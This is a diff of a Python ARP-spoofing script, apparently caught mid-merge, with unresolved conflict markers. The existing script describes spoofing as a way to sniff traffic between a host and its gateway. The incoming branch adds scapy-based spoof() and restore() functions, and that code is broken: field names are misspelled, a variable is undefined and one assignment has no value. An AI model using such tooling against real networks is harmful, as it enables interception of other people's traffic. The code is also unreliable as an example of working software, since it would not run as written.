@@ -1,3 +1,4 @@
+<<<<<<< HEAD
 '''
 MAC spoofing is mainly used to sniff packets being sent between
 a host and the default gateway. To change your mac address to look
@@ -50,3 +51,21 @@ except KeyboardInterrupt:
     print("Restoring...")
     restore(target_ip, default_gateway_ip)
     restore(default_gateway_ip, target_ip)
+=======
+import scapy
+
+interface = 'lo'
+
+def spoof(target_ip, spoof_ip):
+    # get mac address of target
+    packet = scapy.ARP(op=2, hwdst=mac, psdt=target_ip, prsrc=spoof_ip)
+    scapy.send(packet, iface=interface, verbose=False)
+
+def restore(dest_ip, source_ip):
+    dest_mac = #mac
+    src_mac = #mac
+    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=src_mac)
+    scapy.send(packet, iface=interface, verbose=False)
+
+# While loop spoofing targets
+>>>>>>> 18a8f677b5de81953c81741dae8adeb3944460b5
